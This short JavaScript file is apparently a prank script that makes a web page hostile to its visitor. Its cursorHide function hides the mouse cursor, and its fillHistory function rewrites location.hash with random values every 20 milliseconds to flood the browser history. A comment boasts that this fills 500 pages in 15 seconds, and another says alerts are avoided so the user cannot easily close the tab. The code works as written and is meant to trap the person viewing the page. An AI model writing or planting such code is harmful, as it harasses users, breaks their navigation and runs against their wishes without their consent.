/* A side note: We will not be using any alerts because then the user can easily close the tab. */


//Declaring all variables




//Main Functions

function annoy(){
/* function at line 18 */ cursorHide();
/* function at line 22*/ fillHistory();

};

//Sub-Functions 
function cursorHide(){
// hides the cursor. 
 document.getElementById("html").style = 'cursor:none';
}
function fillHistory(){
  //This command makes you fill history. This is easily bypassable if you have... OPERA GX! jk its not sponsored. or is it?
  // im not going to add any "special" effects here, just plain ol' randomizing. depressing right?
  var randomize = Math.floor(Math.random()*3827393);
  location.hash = `${randomize}${randomize}${randomize}`;
setTimeout(fillHistory,20); 
  /*we add 20 here because we don't want to lag out the user computer TOO much 

fun fact, this command fills 500 pages in 15 seconds! */
}
